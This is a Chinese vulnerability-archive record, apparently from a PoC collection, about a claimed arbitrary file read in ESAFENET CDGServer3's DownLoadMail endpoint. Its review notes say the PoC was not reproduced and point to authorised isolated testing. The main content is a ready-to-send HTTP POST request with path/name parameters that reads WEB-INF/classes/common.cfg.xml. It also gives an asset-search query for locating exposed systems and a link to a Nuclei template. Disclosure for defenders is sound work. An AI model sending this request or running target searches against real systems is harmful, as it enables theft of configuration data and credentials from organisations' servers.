---
source: "wy876 漏洞文库"
title: "亿赛通CDGServer3 DownLoadMail path/name任意读取声称"
product: "亿赛通CDGServer3"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "读取WEB-INF/classes/common.cfg.xml，版本未知"
prerequisites: "两条同名JSESSIONID，认证状态未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/wdt0bxk0o0adw6zu"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BA%BF%E8%B5%9B%E9%80%9A/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FDownLoadMail%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name="
hunter: "app.name=\"ESAFENET 亿赛通文档安全管理系统\""
id: "vw-9b54b57249aed993bb44f0e1"
entity_id: "ve-9b54b57249aed993bb44f0e1"
schema_version: "1"
---

# 亿赛通CDGServer3 DownLoadMail path/name任意读取声称

## 条目说明

- 对象与具体问题：亿赛通CDGServer3；DownLoadMail path/name任意读取声称
- 版本、配置及部署条件：读取WEB-INF/classes/common.cfg.xml，版本未知
- 认证与权限前提：两条同名JSESSIONID，认证状态未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 重复JSESSIONID解析存在歧义，应保留有效会话过程与匿名对照
- 样例仅应用配置读取，任意文件包括绝对系统文件需独立证明
- Nuclei仅外部附件无内联内容/版本/哈希，不等于本篇可审规则
- 无响应/根因/修复；与ClientAjax不同读取方法

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
亿赛通电子文档安全管理系统是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统DownLoadMail存在任意文件读取漏洞。

## 二、影响版本
+ 亿赛通电子文档安全管理系统

## 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面


## 四、漏洞复现
```http
POST /CDGServer3/esafenet/DownLoadMail HTTP/1.1
Host: {hostname}
Cookie: JSESSIONID=F******************************F; JSESSIONID=0******************************C
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded

path=/WEB-INF/classes/&name=common.cfg.xml
```

> 请求长度说明：原资料 Content-Length 为 42；静态长度已移除，应由客户端根据最终请求体的字节数生成。


nuclei脚本

[亿赛通电子文档安全管理系统-downloadmail-文件读取.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1713621691094-966b96fe-5f06-4dd5-b160-becec33698b9.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wdt0bxk0o0adw6zu>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
